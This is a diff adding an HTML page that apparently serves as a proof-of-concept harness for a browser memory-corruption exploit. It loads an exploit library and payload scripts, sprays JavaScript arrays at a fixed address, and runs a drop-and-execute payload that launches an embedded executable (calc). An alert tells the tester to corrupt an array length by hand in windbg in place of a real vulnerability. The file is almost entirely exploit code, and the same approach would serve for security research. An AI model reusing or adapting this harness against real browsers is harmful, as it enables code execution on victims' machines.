@@ -1,0 +1,35 @@
+<html>
+
+<head>
+<script src='lib/explib2.js'></script>
+<script src='payload/exec.js'></script>
+<script src='payload/drop_exec.js'></script>
+<script src='calc.js'></script>
+</head>
+
+
+<script>
+
+
+var num_arrays = 98688;
+var arr_size = (0x1000 - 0x20)/4;
+//var explib = new ExpLib( num_arrays, arr_size, 0x1a1b3000, new payload_exec('calc.exe') );
+var explib = new ExpLib( num_arrays, arr_size, 0x1a1b3000, new payload_drop_exec(pe_calc) );
+
+
+
+explib.spray();
+
+/*
+* Modify array length
+* In the real world exp, you  need to modify the array length field with your vulnerability
+*/ 
+alert( 'Execute the command in windbg: "ed 1a1b3000+18 400"' );
+
+
+explib.go();
+
+
+</script>
+</body>
+</html>
